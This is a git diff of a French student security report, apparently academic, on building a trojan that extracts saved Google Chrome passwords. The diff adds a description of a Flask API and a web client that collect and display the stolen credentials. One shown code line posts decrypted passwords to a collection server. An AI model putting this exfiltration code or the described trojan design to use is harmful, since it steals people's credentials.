@@ -2,7 +2,6 @@
 
 ## Table des matières
 
-- [Sécurité - Écriture d'un Troyen - Aubert \& Vuilliomenet](#sécurité---écriture-dun-troyen---aubert--vuilliomenet)
   - [Table des matières](#table-des-matières)
   - [Contexte](#contexte)
   - [État de l'art](#état-de-lart)
@@ -10,6 +9,7 @@
   - [Mise en place concrète](#mise-en-place-concrète)
     - [Social engineering](#social-engineering)
     - [Implémentation](#implémentation)
+    - [API et Frontend](#api-et-frontend)
     - [Création d'un exécutable](#création-dun-exécutable)
   - [Résultats](#résultats)
   - [Limitations et perspectives](#limitations-et-perspectives)
@@ -54,7 +54,7 @@ Lien sur son post : https://infosecwriteups.com/how-i-created-a-trojan-malware-e
 
 ## Mise en place concrète
 
-Nous avons commencé par établir un but, un certain type de données que nous voulions récupérer. Nous avons choisi les mots de passes car c'est généralement des données difficiles à obtenir et donc intéréssant à implémenter. Nous avons eu vent de la possibilité de récupérer les mots de passes en clair de personnes possédant des mots de passe enregistrés sur le gestionnaire de mots-de-passe de Google Chrome (passwords.google.com). Cette informations nous vient du lien suivant : https://techbrowser.co/browser/google-chrome/where-are-google-chrome-passwords-stored/.
+Nous avons commencé par établir un but, un certain type de données que nous voulions récupérer. Nous avons choisi les mots de passes car c'est généralement des données difficiles à obtenir et donc intéréssant à implémenter. Nous avons eu vent de la possibilité de récupérer les mots de passes en clair de personnes possédant des mots de passe enregistrés sur le [gestionnaire de mots-de-passe de Google Chrome](https://passwords.google.com). Cette informations nous vient du lien suivant : https://techbrowser.co/browser/google-chrome/where-are-google-chrome-passwords-stored/.
 
 ### Social engineering
 
@@ -150,8 +150,17 @@ API_URL = "http://127.0.0.1:5000"
 requests.post(API_URL + "/add", json={ "url": url, "username": username, "email": "", "password": decrypted_pass })
 ```
 
-6. Affichage des mots de passe sur client web
+### API et Frontend
 
+Nous avons créé une API en python avec le framework Flask. Cette API permet de recevoir les données envoyées par le troyen et de les stocker dans une base de données. Elle met également à disposition une route pour récupérer les données.
+
+Le code source de cette API se trouve dans répertoire `/api`.
+
+Nous avons aussi créé un frontend à l'aide du framework Vue3 et de Quasar. Ce client web permet de visualiser les données stockées dans la base de données. Cette partie est détaillée dans la section [Résultats](#résultats).
+
+Le code source de ce frontend se trouve dans le répertoire `/client`.
+
+Toutes les marches à suivre pour mettre en place l'environnement de délveoppement afin de lancer l'API et le frontend se trouvent dans le fichier `README.md` à la racine de ce projet.
 
 ### Création d'un exécutable
 
@@ -177,9 +186,6 @@ La Figure 2 montre l'interface du client web, sur laquelle sont affichées les i
     <figcaption>Figure 2 : Interface du client web</figcaption>
 </figure>
 
-
-
-
 ## Limitations et perspectives
 
 Nous aurions pu passer plus de temps sur la discrétion de notre troyen. Par exemple, obfusquer le code afin que ce soit compliqué de comprendre où sont envoyés les données et ce qui est volé à la cible.
@@ -202,7 +208,7 @@ De plus, nous aurions pu mélanger notre troyen et la récupération de mot de p
 ### Illustrations
 
  - Figure 1 : http://www.droits-justice-et-securites.fr/intrusion/un-cheval-de-troie-dans-ma-messagerie/
+ - Figure 2 : Capture d'écran du client web
 
 
 <link rel="stylesheet" href="report.css">
-
